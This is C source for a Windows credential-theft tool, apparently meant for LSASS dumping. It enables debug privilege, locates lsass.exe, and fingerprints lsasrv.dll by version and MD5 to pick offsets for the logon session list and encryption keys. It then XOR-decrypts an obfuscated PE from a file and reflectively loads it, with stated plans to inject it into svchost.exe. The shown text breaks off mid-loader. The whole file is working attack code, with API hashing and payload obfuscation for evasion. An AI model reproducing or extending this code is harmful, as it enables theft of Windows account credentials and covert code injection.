//#include "pch.h"
#include <Windows.h>
#include <tchar.h>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <userenv.h>
#include <windows.h>
#include <wincrypt.h>
#define jinyongyutiaoshi
#define defincaoniam 9168
#define HASH_KEY						13
#pragma intrinsic( _rotr )

inline void MYS_ecureZeroMemory(char* fuck, int number) {
	for (int i = 0; i < number; i++) {
		fuck[i] = 0;
	}
}

void FBXorCrypt(char* str, size_t len) {
	int intArr[100] = { 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 };
	int i;
	for (i = 0; i < len; i++) {
		str[i] = intArr[i] ^ str[i];
	}
}
DWORD myfuckingpow(int a, int b) {
	int sum = 1;
	for (int i = 0; i < b; i++) {
		sum = a * sum;
	}
	if (b == 0)return 1;
	return sum;
}
typedef struct
{
	WORD	offset : 12;
	WORD	type : 4;
} IMAGE_RELOC, * PIMAGE_RELOC;
__forceinline DWORD ror(DWORD d)
{
	return _rotr(d, HASH_KEY);
}

__forceinline DWORD hash(char* c)
{
	register DWORD h = 0;
	do
	{
		h = ror(h);
		h += *c;
	} while (*++c);

	return h;
}
//

#define DEREF( name )*(UINT_PTR *)(name)
#define DEREF_64( name )*(DWORD64 *)(name)
#define DEREF_32( name )*(DWORD *)(name)
#define DEREF_16( name )*(WORD *)(name)
#define DEREF_8( name )*(BYTE *)(name)

#define KERNEL32DLL_HASH				0x6A4ABC5B
#define NTDLLDLL_HASH					0x3CFA685D

#define LOADLIBRARYA_HASH				0xEC0E4E8E
#define GETPROCADDRESS_HASH				0x7C0DFCAA
#define VIRTUALALLOC_HASH				0x91AFCA54
#define NTFLUSHINSTRUCTIONCACHE_HASH	0x534C0AB8
// struct _PEB is defined in Winternl.h but it is incomplete
// WinDbg> dt -v ntdll!_PEB
typedef struct _PEB_FREE_BLOCK // 2 elements, 0x8 bytes
{
	struct _PEB_FREE_BLOCK* pNext;
	DWORD dwSize;
} PEB_FREE_BLOCK, * PPEB_FREE_BLOCK;

//===============================================================================================//
typedef struct _UNICODE_STR
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR pBuffer;
} UNICODE_STR, * PUNICODE_STR;

typedef struct _PEB_LDR_DATA //, 7 elements, 0x28 bytes
{
	DWORD dwLength;
	DWORD dwInitialized;
	LPVOID lpSsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	LPVOID lpEntryInProgress;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct __PEB // 65 elements, 0x210 bytes
{
	BYTE bInheritedAddressSpace;
	BYTE bReadImageFileExecOptions;
	BYTE bBeingDebugged;
	BYTE bSpareBool;
	LPVOID lpMutant;
	LPVOID lpImageBaseAddress;
	PPEB_LDR_DATA pLdr;
	LPVOID lpProcessParameters;
	LPVOID lpSubSystemData;
	LPVOID lpProcessHeap;
	PRTL_CRITICAL_SECTION pFastPebLock;
	LPVOID lpFastPebLockRoutine;
	LPVOID lpFastPebUnlockRoutine;
	DWORD dwEnvironmentUpdateCount;
	LPVOID lpKernelCallbackTable;
	DWORD dwSystemReserved;
	DWORD dwAtlThunkSListPtr32;
	PPEB_FREE_BLOCK pFreeList;
	DWORD dwTlsExpansionCounter;
	LPVOID lpTlsBitmap;
	DWORD dwTlsBitmapBits[2];
	LPVOID lpReadOnlySharedMemoryBase;
	LPVOID lpReadOnlySharedMemoryHeap;
	LPVOID lpReadOnlyStaticServerData;
	LPVOID lpAnsiCodePageData;
	LPVOID lpOemCodePageData;
	LPVOID lpUnicodeCaseTableData;
	DWORD dwNumberOfProcessors;
	DWORD dwNtGlobalFlag;
	LARGE_INTEGER liCriticalSectionTimeout;
	DWORD dwHeapSegmentReserve;
	DWORD dwHeapSegmentCommit;
	DWORD dwHeapDeCommitTotalFreeThreshold;
	DWORD dwHeapDeCommitFreeBlockThreshold;
	DWORD dwNumberOfHeaps;
	DWORD dwMaximumNumberOfHeaps;
	LPVOID lpProcessHeaps;
	LPVOID lpGdiSharedHandleTable;
	LPVOID lpProcessStarterHelper;
	DWORD dwGdiDCAttributeList;
	LPVOID lpLoaderLock;
	DWORD dwOSMajorVersion;
	DWORD dwOSMinorVersion;
	WORD wOSBuildNumber;
	WORD wOSCSDVersion;
	DWORD dwOSPlatformId;
	DWORD dwImageSubsystem;
	DWORD dwImageSubsystemMajorVersion;
	DWORD dwImageSubsystemMinorVersion;
	DWORD dwImageProcessAffinityMask;
	DWORD dwGdiHandleBuffer[34];
	LPVOID lpPostProcessInitRoutine;
	LPVOID lpTlsExpansionBitmap;
	DWORD dwTlsExpansionBitmapBits[32];
	DWORD dwSessionId;
	ULARGE_INTEGER liAppCompatFlags;
	ULARGE_INTEGER liAppCompatFlagsUser;
	LPVOID lppShimData;
	LPVOID lpAppCompatInfo;
	UNICODE_STR usCSDVersion;
	LPVOID lpActivationContextData;
	LPVOID lpProcessAssemblyStorageMap;
	LPVOID lpSystemDefaultActivationContextData;
	LPVOID lpSystemAssemblyStorageMap;
	DWORD dwMinimumStackCommit;
} _PEB, * _PPEB;

// WinDbg> dt -v ntdll!_LDR_DATA_TABLE_ENTRY
//__declspec( align(8) ) 
typedef struct _LDR_DATA_TABLE_ENTRY
{
	//LIST_ENTRY InLoadOrderLinks; // As we search from PPEB_LDR_DATA->InMemoryOrderModuleList we dont use the first entry.
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STR FullDllName;
	UNICODE_STR BaseDllName;
	ULONG Flags;
	SHORT LoadCount;
	SHORT TlsIndex;
	LIST_ENTRY HashTableEntry;
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

// WinDbg> dt -v ntdll!_PEB_
typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR);
typedef FARPROC(WINAPI* GETPROCADDRESS)(HMODULE, LPCSTR);
typedef LPVOID(WINAPI* VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
typedef DWORD(NTAPI* NTFLUSHINSTRUCTIONCACHE)(HANDLE, PVOID, ULONG);

char _final_md5_hash[33];
bool CalculateMD5(char* filePath) {
	HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		//	、、std::cerr << "Error opening file: " << (unsigned int)GetLastError() << std::endl;
		return false;
	}


	HCRYPTPROV hProv;
	if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
		//std::cerr << "CryptAcquireContext failed: " << (unsigned int)GetLastError() << std::endl;
		CloseHandle(hFile);
		return false;
	}

	HCRYPTHASH hHash;
	if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
		///std::cerr << "CryptCreateHash failed: " << (unsigned int)GetLastError() << std::endl;
		CryptReleaseContext(hProv, 0);
		CloseHandle(hFile);
		return false;
	}

	const DWORD bufferSize = 8192;
	BYTE buffer[bufferSize];
	DWORD bytesRead;

	while (ReadFile(hFile, buffer, bufferSize, &bytesRead, NULL) && bytesRead > 0) {
		if (!CryptHashData(hHash, buffer, bytesRead, 0)) {
			//	std::cerr << "CryptHashData failed: " << (unsigned int)GetLastError() << std::endl;
			CryptDestroyHash(hHash);
			CryptReleaseContext(hProv, 0);
			CloseHandle(hFile);
			return false;
		}
	}

	BYTE hash[16];
	DWORD hashSize = 16;
	if (!CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashSize, 0)) {
		//std::cerr << "CryptGetHashParam failed: " << (unsigned int)GetLastError() << std::endl;
		CryptDestroyHash(hHash);
		CryptReleaseContext(hProv, 0);
		CloseHandle(hFile);
		return false;
	}

	CryptDestroyHash(hHash);
	CryptReleaseContext(hProv, 0);
	CloseHandle(hFile);


	// Convert the binary hash to a hexadecimal string
	//printf("md5 hash:\n\t");
	for (int i = 0; i < 16; i++) {
		sprintf(_final_md5_hash + i * 2, "%02x", hash[i]);
	}
	printf("%s\n", _final_md5_hash);


	return true;
}


int mainMD5() {
	char filePath[100] = "C:\\windows\\system32\\lsasrv.dll";

	return CalculateMD5(filePath);
}
#define TABLE_LENGTH 1024
bool EnableDebugPrivilege()
{
	HANDLE tokenHandle;
	TOKEN_PRIVILEGES tokenPrivileges;
	LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle))
	{
		//std::cout << "Failed to open process token. Error: " << (unsigned int)GetLastError() << std::endl;
		return false;
	}

	if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid))
	{
		//std::cout << "Failed to lookup privilege value. Error: " << (unsigned int)GetLastError() << std::endl;
		CloseHandle(tokenHandle);
		return false;
	}

	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luid;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr))
	{
		//std::cout << "Failed to adjust token privileges. Error: " << (unsigned int)GetLastError() << std::endl;
		CloseHandle(tokenHandle);
		return false;
	}

	CloseHandle(tokenHandle);
	return true;
}
bool FBFileExists(const char* szPath) {
	DWORD dwAttrib = GetFileAttributesA(szPath);
	return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
		!(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}
#pragma comment(lib, "Version.lib")

DWORD offset_table[TABLE_LENGTH] = {
	0x32BC3,
	0x1FA63
};

DWORD _offset_table[TABLE_LENGTH][5] = {
	// 目前来看，最后一个偏移量，只有win7系列的是0x18
	// loonglost\3des\aes\判断决定随便写\0x38或者0x18
	  {0x32BC3,0x39E5C,0x9E36E,0x108,0x38},
	  {0x180B3,0x20CEC,0x94568,0x108,0x38}, // 10.0.19041.2913
	  {0x16150,0x111DE,0x3261B,0xE8,0x18},
	  {0x2D2B3,0x1C55C,0x4250C,0x108,0x38},
	  {0x285FF,0x3992C,0x399EC,0x108,0x38},
	  {0x1FBAC,0x1AA1C,0x1AAE8,0x108,0x38},// 10.0.17763.1
	  {0x1C448,0x193EE,0x39B2A,0xE8,0x18},
	  {0x16030,0x110FE,0x32B0B,0xE8,0x18},
	  {0x4482B,0x4DBA8,0xB0A90,0xE8,0x38},
	  {0x10588,0xD8FE,0x4CE0C,0xE8,0x18},
	  {0x915C,0x3E328,0x3E34D,0xE8,0x38},
	{0x1FA63,0x395DC,0x8CA6C,0xe8,0x38}, // 10.0.19041.3324
	{0x37DEC,0x320FC,0x321C8,0xe8,0x38} , // 6548b134a3cf304b91490fe916d934b5
	{0x374DC,0x31E3C,0x31F08,0xe8,0x38},  // 951a238e964be37f74c32564d2a92319
	{0x39323,0x3016C,0x86FD4,0xe8,0x38} ,// dd8cacce0209e5f7c4c31720e24178f0
		{0x790c,0x3e018,0x3e03d,0xe8,0x38} // eb9aabe72baa8821b10a99cf4c086973
};
void getosversion(char* result) {
	char buffer[1024] = { 0 };
	char PATH[1024] = "C:\\windows\\system32\\lsasrv.dll";
	GetFileVersionInfoA(PATH,
		NULL,
		1024,
		(LPVOID)buffer);
	//	printf("%s\n", buffer);
		// 这很简单，遍历这个buffer，直到找到FileVersion的unicode版本就行了
		// 字节序里,长度22
	int result_counter = 0;
	byte asdasdasdbyte[1024] = { 0x46,0x00,0x69,0x00,0x6c,0x00,0x65,0x00,0x56,0x00,0x65,0x00,0x72,0x00,0x73,0x00,0x69,0x00,0x6f,0x00,0x6e,0x00 };
	for (int i = 0; i < 1024; i++) {
		// 相等则说明已经遍历到了fileversion字符串了
		if (0 == memcmp(buffer + i, asdasdasdbyte, 22)) {
			// 往后偏移四个字节就是版本号了
			char* versionoffset = buffer + i + 22 + 4;
			// 这个版本号其实就是一个unicode字符串，往后遍历，一直遍历到两个0就行了
			byte terminator[1024] = { 0x0,0x0 };
			int first = 1;
			for (int gi = 0; gi < 1024; gi++) {
				if (0 == memcmp(versionoffset + gi, terminator, 2)) {
					// 遍历完成，返回就行了
					return;
				}
				if (*(versionoffset + gi) != 0) {
					char _1[2] = { 0 };
					sprintf_s(_1, "%s", versionoffset + gi);
					if (first == 1) {
						//strcpy_s(result,2, _1);
						memcpy_s(result + result_counter, 100, _1, 1);
						result_counter += 1;
						first = 0;
					}
					else {
						//strcat_s(result+1,2, _1);
						memcpy_s(result + result_counter, 100, _1, 1);
						result_counter += 1;
					}
				}
			}
		}
	}
}


int GetLsassPid() {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (Process32First(hSnapshot, &entry)) {
		while (Process32Next(hSnapshot, &entry)) {
			if (wcscmp(entry.szExeFile, L"lsass.exe") == 0) {
				return entry.th32ProcessID;
			}
		}
	}
	CloseHandle(hSnapshot);
	return 0;
}

int GetLsvchostsassPid() {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (Process32First(hSnapshot, &entry)) {
		while (Process32Next(hSnapshot, &entry)) {
			if (wcscmp(entry.szExeFile, L"svchost.exe") == 0) {
				return entry.th32ProcessID;
			}
		}
	}
	CloseHandle(hSnapshot);
	return 0;
}

int main()
{
/*stringarray*/	char version_table[TABLE_LENGTH][50] = {
	"10.0.19041.1",
	"10.0.19041.2913",
	"6.1.7601.17514",
	"10.0.22621.1",
	"10.0.14393.0",
	"10.0.17763.1",
	"6.1.7601.24214",
	"6.1.7600.16385",
	"6.3.9600.16384",
	"6.1.7601.26561",
	"10.0.16299.431",
	"10.0.19041.3324",
	"10.0.17763.4377",
	"10.0.17763.4377",
	"10.0.19041.3570",
	"10.0.16299.15"
	};/*endarray*/
/*stringarray*/	char _md5_table[TABLE_LENGTH][33] = {
		"e862003aea8c3463f72d7225d1dfbcf0", // 10.0.19041.1
		"d22e0221ffa5e33b1ef37b104ff55614", // 10.0.19041.2913
		"6.1.7601.17514",
		"bba627660c84ba035bdccadbb97285da",	// 10.0.22621.1
		"10.0.14393.0",
		"1ba40d15426fe568e443a52e008db1d7", // 10.0.17763.1
		"6.1.7601.24214",
		"6.1.7600.16385",
		"6.3.9600.16384",
		"6.1.7601.26561",
		"10.0.16299.431",
		"f17409ddc9a794eb39cfcd21d2c84c6f", // 10.0.19041.3324
		"6548b134a3cf304b91490fe916d934b5", // 10.0.17763.4377
		"951a238e964be37f74c32564d2a92319", // 10.0.17763.4377
		"dd8cacce0209e5f7c4c31720e24178f0", // 10.0.19041.3570
		"eb9aabe72baa8821b10a99cf4c086973" // 10.0.16299.15

	};/*endarray*/
	if (FBFileExists("C:\\users\\public\\3iaad")) {
		DeleteFileA("C:\\users\\public\\3iaad");
	}
	if (FBFileExists("C:\\users\\public\\kiaad")) {
		DeleteFileA("C:\\users\\public\\kiaad");
	}
	if (FBFileExists("C:\\users\\public\\ili6ao")) {
		DeleteFileA("C:\\users\\public\\ili6ao");
	}
	if (FBFileExists("C:\\users\\public\\aiaad")) {
		DeleteFileA("C:\\users\\public\\aiaad");
	}





	EnableDebugPrivilege();
	DWORD pid = GetLsassPid();
	// 我需要先获取lsasrv.dll的版本信息，从而得到关键的3个符号的偏移量信息
	char* res = (char*)malloc(50);
	ZeroMemory(res, 50);
	getosversion(res);
	//printf("%s\n", res);
		// 遍历到第一个空格
	for (int i = 0; i < 1234; i++) {
		if (res[i] == ' ') {
			// 在这里断掉
			res[i] = '\0'; break;
		}
	}
	printf("[*] version: %s\n", res);


	// 获取版本号，通过版本号来控制credential的偏移量
	char* asdasdasdasd = (char*)malloc(123);
	ZeroMemory(asdasdasdasd, 123);

	char* readlyversionnumber = (char*)malloc(123);
	ZeroMemory(readlyversionnumber, 123);
	int counterrerer = 0;
	memcpy_s(asdasdasdasd, 123, res, strlen(res));
	for (int i = 0; i < strlen(asdasdasdasd); i++) {
		if (asdasdasdasd[i] == '.') {
			counterrerer++;
			// 从这里往后面遍历
			if (counterrerer == 2) {
				int asdasdcounasdasdasdasd = 0;
				for (int j = i + 1;; j++) {
					asdasdcounasdasdasdasd++;
					if (asdasdasdasd[j] == '.') {
						break;
					}
				}
				memcpy_s(readlyversionnumber, 123, asdasdasdasd + i + 1, asdasdcounasdasdasdasd - 1);
			}
		}
	}
	printf("build version: %s\n", readlyversionnumber);
	int maxpowenum = strlen(readlyversionnumber) - 1;
	int finalnumber = 0;
	int oi = 0;
	for (int i = 0; i < maxpowenum; i++) {
		int temp = (readlyversionnumber[oi++] - '0') * myfuckingpow(10, maxpowenum - i);
		finalnumber += temp;
	}
	finalnumber = finalnumber + readlyversionnumber[strlen(readlyversionnumber) - 1] - '0';
	int _build_version = finalnumber;


	int offset____ = 0;
	if (_build_version < 3000) {
		offset____ = 0x70;
	}
	else if (_build_version < 5000) {
		offset____ = 0x70;
	}
	else if (_build_version < 7000) {
		offset____ = 0xd8;
	}
	else if (_build_version < 8000) {
		offset____ = 0xd8;
	}
	else if (_build_version < 9400) {
		offset____ = 0xf8;
	}
	else {
		offset____ = 0x108;
	}
	// 我们把lsasrv.dll自己加载上来看一下ntheader就行了
	// 这个dll无法加载lsasrv这个dll，直接读取文件头算了
	//unsigned char* lsasrvLocal = (unsigned char*)LoadLibraryA("C:\\windows\\system32\\lsasrv.dll");
	//DWORD error = (unsigned int)GetLastError();
	//if (lsasrvLocal == (unsigned char*)0) {
	//	//printf("[x] load module failed, abort...\n");

	//	char fixed2s3[123] = "[x] load module failed, abort...\n";
	//	fwrite(fixed2s3, 1, strlen(fixed2s3), file);
	//	return 1;
	//}
	HANDLE asdasdhFile = CreateFileA("C:\\windows\\system32\\lsasrv.dll",                // name of the write
		GENERIC_READ,          // open for writing
		0,                      // do not share
		NULL,                   // default security
		OPEN_EXISTING,             // create new file only
		FILE_ATTRIBUTE_NORMAL,  // normal file
		NULL);                  // no attr. template
	if (asdasdhFile == INVALID_HANDLE_VALUE) {
		printf("[x] read module failed, abort...\n");

		//	char fixed2s3[123] = "[x] read module failed, abort...\n";
			//、、fwrite(fixed2s3, 1, strlen(fixed2s3), file); fclose(file);
		return 1;
	}
	BYTE* ReadBufferasdasd = (BYTE*)malloc(0x1000); DWORD ol = 0;
	ReadFile(asdasdhFile, ReadBufferasdasd, 0x1000, &ol, NULL);//) )
	BYTE* lsasrvLocal = ReadBufferasdasd;
	IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)lsasrvLocal;
	if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
		return 1;
	}
	IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)lsasrvLocal + idh->e_lfanew);

	// 还有一种例外情况
	if (_build_version > 7000 && _build_version < 9400 && nt_headers->FileHeader.TimeDateStamp>0x53480000) {
		offset____ = 0xe8;
	}

	DWORD offset = 0;
	for (int i = 0; i < TABLE_LENGTH; i++) {
		if (0 == version_table[i])break;
		if (strcmp(res, version_table[i]) == 0) {
			// 版本相同之后我们还需要比对md5值，因为在后续的测试过程中我发现，并不是
			// 说版本号一致，lsasrv.dll就是一样的，需要使用校验和来确定
			// 获取lsasrv.dll文件的md5值
			ZeroMemory(_final_md5_hash, 33);
			if (!mainMD5()) {
				printf("md5 failed, abort...\n"); exit(-1);
			}
			// 由于索引一致，直接从当前位置往后搜索
			if (strcmp(_final_md5_hash, _md5_table[i]) != 0) {
				printf("md5 mismatch, continue searching\n"); continue;
			}
			offset = 1;
			// 记录下来这个索引，写入到文件中，供注入到svchost.exe进程中的shellcode去读取
			char write_out[123] = { 0 };
			sprintf_s(write_out, 123, "%03d", i);
			sprintf_s(write_out + 3, 120, "%07d", pid);

			// 我们从_offset_table中根据上面获取到的index，写入四个偏移量
			// logonsessionlist、3des、aes、credential字段在logonsessionlist节点中的偏移
			// 我们写入的结构为  3bytes 索引 （现在已经没啥用了，只不过我懒得改）
			// 7字节lsass pid
			// 偏移量的长度不会超过8字节，我们将其格式化为0填充的8位16进制字符串
			// 8字节偏移量   4个一共占32字节

			sprintf_s(write_out + 3 + 7, 123, "%08x", _offset_table[i][0]);
			sprintf_s(write_out + 3 + 7 + 8, 123, "%08x", _offset_table[i][1]);
			sprintf_s(write_out + 3 + 7 + 8 + 8, 123, "%08x", _offset_table[i][2]);
			// credential offset
		//	sprintf_s(write_out + 3 + 7 + 8 + 8 + 8, 123, "%08x", _offset_table[i][3]);
			// 这个偏移需要进行很多的判断，不能直接硬编码
			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8, 123, "%08x", offset____);
			// 
				// _3des_aes_len_offset   windows10系列和windows7系列有点不一样
			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8 + 8, 123, "%02x", _offset_table[i][4]);

			// 把版本号也写进去
			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8 + 8 + 2, 123, "%s", res);


			FILE* fptr;
			if (FBFileExists("C:\\users\\public\\ili6ao"))DeleteFileA("C:\\users\\public\\ili6ao");
			// Open a file in writing mode
			fopen_s(&fptr, "C:\\users\\public\\ili6ao", "w");

			// Write some text to the file
			fprintf(fptr, write_out);

			// Close the file
			fclose(fptr);
			break;
		}
	}
	if (!offset) {
		printf("[-] unknown version or no md5 matched, abort...\n");
		free(res);
		// 把文件拷贝出来
		char PasdadsaATH[1024] = "C:\\windows\\system32\\lsasrv.dll";
		char PasdadsaATH2[1024] = "C:\\users\\public\\9at2";
		if (FBFileExists(PasdadsaATH2))DeleteFileA(PasdadsaATH2);
		CopyFileA(PasdadsaATH, PasdadsaATH2, FALSE);
		printf("file copied to public folder '9at2',please retrieve it\n");
		// 仅用于调试
#ifdef jinyongyutiaoshi
		//goto caonimade;
#endif // jinyongyutiaoshi

		exit(-1);
	}
	free(res);


caonimade:


#ifdef jinyongyutiaoshi
	CopyFileA("C:\\users\\public\\ili6ao - Copy", "C:\\users\\public\\ili6ao", TRUE);
#endif // jinyongyutiaoshi

	// 将shellcode写入目标进程内存并启动shellcode

	// 获取第一个svchost进程的pid
	DWORD _svchost_1_pid = GetLsvchostsassPid();

	//调试阶段我们使用notepad进程作为注入目标
#ifdef jinyongyutiaoshi
	//_svchost_1_pid = defincaoniam;
#endif // jinyongyutiaoshi


// 首先我们要枚举他的module，找到kernel32.dll的base addr

	  // Open the target process
	HANDLE target_hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, _svchost_1_pid);
	DWORD64 _target_process_kernel32_base_addr = 0;
	if (target_hProcess) {
		HMODULE hModuleArray[1024];
		DWORD cbNeeded;

		// Enumerate the modules of the target process
		if (EnumProcessModules(target_hProcess, hModuleArray, sizeof(hModuleArray), &cbNeeded)) {
			for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
				char szModuleName[MAX_PATH];

				// Get the module file name
				if (GetModuleFileNameExA(target_hProcess, hModuleArray[i], szModuleName, MAX_PATH)) {
#ifdef jinyongyutiaoshi
					printf("module name: %s\n", szModuleName);
#endif // jinyongyutiaoshi
					// 比较module名称是否为kernel32.dll
					char _fuckingstring[13] = "kernel32.dll";
					//if (strcmp("kernel32.dll", szModuleName) == 0 || strcmp("KERNEL32.DLL", szModuleName) == 0) {
					//	// 记录下base addr
					//	_target_process_kernel32_base_addr = reinterpret_cast<DWORD64>((char*)hModuleArray[i]);
					//	break;
					//}
					int flag = 1;
					for (int j = 0; j < 12; j++) {
						if ((_fuckingstring[11 - j] != szModuleName[strlen(szModuleName) - 1 - j]) && (_fuckingstring[11 - j] - 32 != szModuleName[strlen(szModuleName) - 1 - j])) {
							flag = 0;
							break;

						}
					}
					if (flag) {
						_target_process_kernel32_base_addr = reinterpret_cast<DWORD64>((char*)hModuleArray[i]);
						break;
					}
				}
			}
		}

		// Close the handle to the target process
		CloseHandle(target_hProcess);
	}
	else {
		printf("can not open target process, error code: %x\n", (unsigned int)GetLastError());
		exit(-1);
	}










	// 从文件中读取shellcode并解密
	// 唯一不同的是，我们这里的shellcode其实是一个混淆过的PE文件
	const char* filePath = "C:\\users\\public\\data.bin"; // Replace with your file path

	// Open the file for reading
	HANDLE hFile = CreateFileA(
		filePath,                   // File path
		GENERIC_READ,               // Access mode (read)
		FILE_SHARE_READ,            // Share mode (allow others to read)
		NULL,                       // Security attributes (default)
		OPEN_EXISTING,              // Creation disposition (open only if it exists)
		FILE_ATTRIBUTE_NORMAL,      // File attributes (normal)
		NULL                        // Template file (not used)
	);

	if (hFile == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "Error opening the file\n");
		return 1;
	}

	// Get the file size
	DWORD fileSize = GetFileSize(hFile, NULL);
	if (fileSize == INVALID_FILE_SIZE) {
		fprintf(stderr, "Error getting file size\n");
		CloseHandle(hFile);
		return 1;
	}

	// Allocate memory for the byte array
	BYTE* byteArray = (BYTE*)malloc(fileSize);
	if (byteArray == NULL) {
		fprintf(stderr, "Error allocating memory\n");
		CloseHandle(hFile);
		return 1;
	}

	// Read the binary data from the file into the byte array
	DWORD bytesRead;
	if (!ReadFile(hFile, byteArray, fileSize, &bytesRead, NULL)) {
		fprintf(stderr, "Error reading from the file\n");
		CloseHandle(hFile);
		free(byteArray);
		return 1;
	}

	// Close the file handle
	CloseHandle(hFile);

	// Now byteArray contains the binary data from the file

	printf("Successfully read %lu bytes from the file: %s\n", bytesRead, filePath);

	// Free the memory allocated for the byte array
	//free(byteArray);
	// 使用疑惑解密byteArray
// 解密方式上进行一些改进，单一的key不太安全，改成长度为10的key
	char _fuckingstring[100];
	MYS_ecureZeroMemory((char*)_fuckingstring, 100); _fuckingstring[0] = 104; _fuckingstring[1] = 115; _fuckingstring[2] = 110; _fuckingstring[3] = 111; _fuckingstring[4] = 108; _fuckingstring[5] = 96; _fuckingstring[6] = 111; _fuckingstring[7] = 1; FBXorCrypt(_fuckingstring, 8);
	for (int i = 0; i < fileSize; i++) {
		byteArray[i] = byteArray[i] ^ (_fuckingstring[i % 7]);
	}





	// uiLibraryAddress是我们的PE文件直接放到内存中的起始地址（还没有加载）
	ULONG_PTR uiLibraryAddress = reinterpret_cast<DWORD64>(byteArray);
	ULONG_PTR uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
	// 根据optionalheade中的sizeofimage分配指定大小的空间
	ULONG_PTR uiBaseAddress = (ULONG_PTR)VirtualAlloc(NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	DWORD64 _pe_addr_load_in_current_process = uiBaseAddress;

	DWORD _memeoy_size_to_be_allocated_in_target_process = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage;
	printf("0x%p bytes will be allocated in target process\n", reinterpret_cast<DWORD64*>((DWORD64)_memeoy_size_to_be_allocated_in_target_process));

	ULONG_PTR uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
	// 老实讲，我不太理解uiLibraryAddress到底是什么东西
	// 那这个可能是一开始的位置，还没有被放到可执行的内存中
	ULONG_PTR uiValueB = uiLibraryAddress;
	ULONG_PTR uiValueC = uiBaseAddress;//这个是即将要加载到内存中的dll的基地址

	while (uiValueA--) // 根据headersize复制头部
		*(BYTE*)uiValueC++ = *(BYTE*)uiValueB++;

	// STEP 3: load in all of our sections...
	// 加载剩余的所有节
	// uiValueA = the VA of the first section
	// 获取SizeOfOptionalHeader的size
	uiValueA = reinterpret_cast<DWORD64>(&(((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader)) + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader;// uiValueA是section header的地址
   // 遍历所有的节并将它们加载到内存中
   // itterate through all sections, loading them into memory.
	ULONG_PTR uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;
	while (uiValueE--)
	{
		// uiValueB is the VA for this section
		uiValueB = (uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress);// 拷贝section header的目的地址

		// uiValueC is the VA for this sections data
		// 在磁盘中的地址
		uiValueC = (uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData);

		// copy the section over
		// 获取原始数据的大小
		ULONG_PTR	uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;

		// 根据原始数据大小，对数据进行拷贝
		while (uiValueD--)
			*(BYTE*)uiValueB++ = *(BYTE*)uiValueC++;

		// get the VA of the next section
	// 拷贝完成后，获取下一个节的地址
		uiValueA += sizeof(IMAGE_SECTION_HEADER);
	}


	// STEP 4: process our images import table...
	// 处理dll的导入表   在处理这一部分的时候，我们需要多加小心
	// 因为我们需要时刻记住，导入的dll的基地址是目标进程的基地址，而不是我们当前进程的基地址

	// uiValueB = the address of the import directory
	// 获取导入表的地址
